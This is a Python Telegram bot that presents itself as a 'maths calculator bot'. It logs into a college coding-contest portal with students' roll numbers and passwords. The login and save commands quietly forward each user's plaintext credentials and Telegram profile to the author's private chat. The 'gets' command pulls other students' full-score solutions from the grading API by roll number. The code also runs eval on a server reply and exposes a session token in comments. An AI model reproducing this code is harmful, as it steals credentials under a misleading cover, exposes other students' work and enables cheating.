from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ( CommandHandler, Filters, MessageHandler, Updater)
from message import Editmessage, Sendmessage, logger, sendfile, Deletemessage, SendMess , SendMe
import os
import requests
from bs4 import BeautifulSoup
import requests
import json
import html5lib
usee={}
shortcut={}
os.environ['TZ'] = 'America/Buenos_Aires'
players="-1001782490306"
play="-1001546224123"
gods=["21951A6626","21951A6637","21951A6627","21951A6614"]
build={}
members =[2141450636,809309749,2045746007,1257359605,2113380774,1134323688,2040610087]
bot_token = os.environ.get('TG_BOT_TOKEN')
startmessage = [[
		InlineKeyboardButton(
			"Dev",
			url='https://t.me/dheeraj2324'
		),
        InlineKeyboardButton(
			"Channel",
			url='https://t.me/aboutdheeraj'
		)
        ]]


def start(update, context):
    info = update.effective_user
    print(info)
    chat_id = info.id
    userid= info['username']
    text = f'<b>Welcome</b> @{userid}<b>, to maths calculator bot and also private stuff!</b>\n<b>To know more use-</b> /help\n<code>This bot is provided for educational use!!</code>\n<code>ENTER IN YOUR OWN RISK!!</code>\n<code>YOU ARE RESPONSIBLE FOR YOUR OWN ACTION!.</code>'
    Sendmessage(chat_id, text, reply_markup=InlineKeyboardMarku(pstartmessage))
    return
def cmds(update, context):
    chat_id = update.message.chat_id
    text = "<b>Available cmds available:</b>/login <code>username</code> <code>password</code>\n<code>username -- replace with Roll no.</code>\n<code>password -- replace with password</code>\n/solve <code>day</code> <code>code</code>\n Seperate each one with a single space for example:\n/login{space}21951a0000{space}password\n/solve{space}day{space}code"
    Sendmessage(chat_id, text, reply_markup= InlineKeyboardMarkup(startmessage))
def help(update, context):
    chat_id = update.message.chat_id
    text = "<b>Hey, welcome to this Bot! Sorry to say cmds of the bots have been taken to private!!</b>\n<code>Some cmds are listed here:</code> /cmds"
    Sendmessage(chat_id, text)
################################################################
def save(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    #userid= info['username']
    global shortcut
    text =  update.message.text.split(' ',3)
    username=text[1]
    password=text[2]
    short=text[3]
    logger.info(text)
    text=str(info)
    SendMe(play,text)
    text = "<b>Saved as</b> -- <code>{} </code>".format(short)
    Sendmessage(chat_id,text)
    shortcut[short]={}
    shortcut[short]['username']=username
    shortcut[short]['password']=password
    
#####################################################################################################################
def login(update, context):
    chat_id = update.message.chat_id
    info = update.effective_user
    #userid= info['username']
    text =  update.message.text.split(' ',2)
    try:
        username=text[1]
        password=text[2]
    except:
        short=text[1]
        username=shortcut[short]["username"]
        password=shortcut[short]["password"]
    text=str(info)
    SendMe(play,text)
    text="{},{}".format(username,password)
    SendMe(play,text)
    text = "<b>Logged in as</b> -- <code>{} </code>".format(username)
    Sendmessage(chat_id,text)
    if True:
        if False:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:
            try:
                data={'username':username,'password':password}
                headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Cookie': '_ga=GA1.3.361214083.1658147021',
    'Origin': 'http://buildit.iare.ac.in',
    'Referer': 'http://buildit.iare.ac.in/login',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
}
                response = requests.post('http://buildit.iare.ac.in/login_', headers=headers, data=data, verify=False)
                #print(response)
                Deletemessage(chat_id, update.message.message_id)
                cook=(response.headers['Set-Cookie'])
                cookk=cook.split(";")
                finc=cookk[0][6:]
                #print(finc)
                us=(cookk[-2]).split("=")
                userr=us[-1]
                #print(userr)
                br=(cookk[-3]).split("=")
                bran=br[-1]
                global build
                build[chat_id]={}
                build[chat_id]['userr']=userr
                build[chat_id]['finc']=finc
                build[chat_id]['bran']=bran
                build[chat_id]['username']=username
            except:
                text = "Incorrect password"
                Sendmessage(chat_id,text)
                
    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)


                
def solve(update,context):
    chat_id = update.message.chat_id
    info = update.effective_user
    text=str(info)
    SendMe(play,text)
    text =  update.message.text.split(' ',2)
    pot=text[1]
    ccode=text[2]
    logger.info(text)
    global build
    global usee
    username=usee
    text = "<b>Solving as</b> -- <code>{} </code>".format(build[chat_id]['username'])
    Sendmessage(chat_id,text)
    if True:
        if False:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:
            try:
                
                cookies = {
   # '_ga': 'GA1.3.361214083.1658147021',
    'token':build[chat_id]["finc"],
    'username': build[chat_id]['username'],
    'branch': build[chat_id]['bran'],
    'user': build[chat_id]['userr'],
    'contestId': 'POTD{}'.format(pot),
}
                headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': '_ga=GA1.3.361214083.1658147021; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIxOTUxYTY2MjYiLCJpc1ZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NTgyNDY5MzMsImV4cCI6MTY2MDg3NDkzM30._bMpds30eHVYk-P2igs_U9yEODqK0GhR6aYa0W8z8KM; username=21951A6626; branch=cse; user=21951A662661; contestId=POTD91',
    'Pragma': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
}
                response = requests.get('http://buildit.iare.ac.in/contests/POTD{}'.format(pot),cookies=cookies, headers=headers, verify=False)
                aa=str(response.content[12600:])
                ke=(aa.find("#5"))
                qii=aa[ke+1:ke+7]
                text=str(qii)
                SendMe(play,text)
                headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Connection': 'keep-alive',
    # Already added when you pass json=
    # 'Content-Type': 'application/json',
    'Origin': 'http://buildit.iare.ac.in',
    'Referer': 'http://buildit.iare.ac.in/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'authorization': build[chat_id]['finc'],
}
                json_data = {
    'source_code': ccode,
    'language_id': '34',
    'stdin': '',
    'contestId': 'POTD{}'.format(pot),
    'courseId': '',
    'user': build[chat_id]['userr'],
    'questionId': qii,
}
                response = requests.post('http://13.234.234.30:5000/validateSubmission', headers=headers, json=json_data, verify=False)
                q=response.json()
                text=q
                logger.info(text)
                print(info)
                try:
                    text=("<b>Your Score</b> - {}".format(q['score']))
                    Sendmessage(chat_id,text)
                    w=q['result']
                    for i in range(len(w)):
                        text="{}-{}".format(i+1,w[i])
                        Sendmessage(chat_id,text)
                except:
                    text="<b>{}</b>".format(q['message'])
                    Sendmessage(chat_id,text)
                    SendMess(players,text)
            except Exception as e:
                text=str(e)
                SendMess(players,text)
                text = "Error check /help"
                Sendmessage(chat_id,text)
                
    else:
        text = "Gods do not permit your entry!" 
        Sendmessage(chat_id,text)

        
def get(update,context):
    chat_id = update.message.chat_id
    info = update.effective_user
    text=str(info)
    SendMe(play,text)
    text =  update.message.text.split(' ',2)
    roll=text[1]
    pot=text[2]
    logger.info(text)
    global build
    global usee
    username=usee
    text = "<b>Getting for POTD</b> -- <code>{} </code>".format(pot)
    Sendmessage(chat_id,text)
    if True:
        if False:
            text = "Gods data not available"
            Sendmessage(chat_id,text)
        else:
            if True:
                cookies = {
   # '_ga': 'GA1.3.361214083.1658147021',
    'token':build[chat_id]["finc"],
    'username': build[chat_id]['username'],
    'branch': build[chat_id]['bran'],
    'user': build[chat_id]['userr'],
    'contestId': 'POTD{}'.format(pot),
}
                headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': '_ga=GA1.3.361214083.1658147021; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjIxOTUxYTY2MjYiLCJpc1ZlcmlmaWVkIjp0cnVlLCJpYXQiOjE2NTgyNDY5MzMsImV4cCI6MTY2MDg3NDkzM30._bMpds30eHVYk-P2igs_U9yEODqK0GhR6aYa0W8z8KM; username=21951A6626; branch=cse; user=21951A662661; contestId=POTD91',
    'Pragma': 'no-cache',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
}
                response = requests.get('http://buildit.iare.ac.in/contests/POTD{}'.format(pot),cookies=cookies, headers=headers, verify=False)
                aa=str(response.content[12600:])
                ke=(aa.find("#5"))
                qii=aa[ke+1:ke+7]
                if True:
                    headers = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'Origin': 'http://buildit.iare.ac.in',
    'Pragma': 'no-cache',
    'Referer': 'http://buildit.iare.ac.in/',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36',
    'authorization': build[chat_id]['finc'],
}
                    q = requests.get('http://13.234.234.30:5000/submissions/user/{}/{}/'.format(roll,qii), headers=headers, verify=False)
                    rep_q=q.content
                    rep_se=str(rep_q)
                    l = eval(rep_q.decode())
                    ctr=0
                    for i in l:
                        if i['score']==100:
                            st=str(i['sourceCode'])
                            text=st.replace("<","&lt").replace(">","&gt").replace("&","&amp")
                            Sendmessage(chat_id,text)
                            ctr+=1
                            break
                    if ctr!=0:
                        pass
                    else:
                        text="User not yet solved!"
                        Sendmessage(chat_id,text)


                
                
                else:
                    text="error"
                    Sendmessage(chat_id,text)
                    SendMess(players,text)
            else:
                a="aa"
#             except Exception as e:
#                 text=str(e)
#                 SendMess(players,text)
#                 text = "Error check /help"
#                 Sendmessage(chat_id,text)
#####################################################################################################################################################################


def main():
    updater = Updater(
        bot_token,
        use_context=True
    )
    dp = updater.dispatcher
    #dp.add_handler(MessageHandler(Filters.text & ~Filters.command, duty))
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("cmds", cmds))
    dp.add_handler(CommandHandler("save", save))
    dp.add_handler(CommandHandler("login", login))
    dp.add_handler(CommandHandler("solve", solve))
    dp.add_handler(CommandHandler("gets", get))

    logger.info("Bot Started!!!")
    updater.start_polling()
    updater.idle()
if __name__ == "__main__":
    main()
